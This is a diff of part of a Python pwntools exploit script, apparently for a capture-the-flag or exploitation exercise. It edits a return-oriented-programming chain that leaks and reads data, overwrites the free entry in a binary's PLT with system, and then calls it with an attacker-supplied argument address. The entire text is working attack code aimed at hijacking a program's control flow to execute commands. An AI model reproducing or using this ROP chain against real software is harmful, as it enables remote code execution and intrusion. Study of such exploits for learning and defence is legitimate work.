@@ -86,10 +86,10 @@ sent_buffer += pwn.p64(POP_RDI) + pwn.p64(0) + pwn.p64(POP_RSI_R15) + pwn.p64(SY
 sent_buffer += pwn.p64(READ)
 
 ## RESEND TO CLIENT FOR DEBUG
-sent_buffer += pwn.p64(POP_MANY) + pwn.p64(0xFFFFFFFFFFFFFFFF) + pwn.p64(0) + pwn.p64(0x60d088) + pwn.p64(8) + pwn.p64(0) + pwn.p64(0)
+sent_buffer += pwn.p64(POP_MANY) + pwn.p64(0xFFFFFFFFFFFFFFFF) + pwn.p64(0) + pwn.p64(0x60d088) + pwn.p64(SYSTEM_ARG_LENGTH) + pwn.p64(0) + pwn.p64(0)
 sent_buffer += pwn.p64(RDX_SHIT)
 sent_buffer += pwn.p64(8) * 7
-sent_buffer += pwn.p64(POP_RDI) + pwn.p64(1) + pwn.p64(POP_RSI_R15) + pwn.p64(LEAK_ADDRESS+8) + pwn.p64(0)
+sent_buffer += pwn.p64(POP_RDI) + pwn.p64(1) + pwn.p64(POP_RSI_R15) + pwn.p64(SYSTEM_ARG_ADDRESS) + pwn.p64(0)
 sent_buffer += pwn.p64(WRITE)
 
 ## OVERRIDE FREE IN PLT WITH SYSTEM CALCULATED BY CLIENT
@@ -100,7 +100,7 @@ sent_buffer += pwn.p64(POP_RDI) + pwn.p64(0) + pwn.p64(POP_RSI_R15) + pwn.p64(LE
 sent_buffer += pwn.p64(READ)
 
 ## CALL OVERRIDDEN FREE/SYSTEM
-sent_buffer += pwn.p64(POP_RDI) + pwn.p64(LEAK_ADDRESS+8)
+sent_buffer += pwn.p64(POP_RDI) + pwn.p64(SYSTEM_ARG_ADDRESS)
 sent_buffer += pwn.p64(POP_RBP) + pwn.p64(LEAK_ADDRESS-0x48)
 sent_buffer += pwn.p64(CALL_RBP)
 
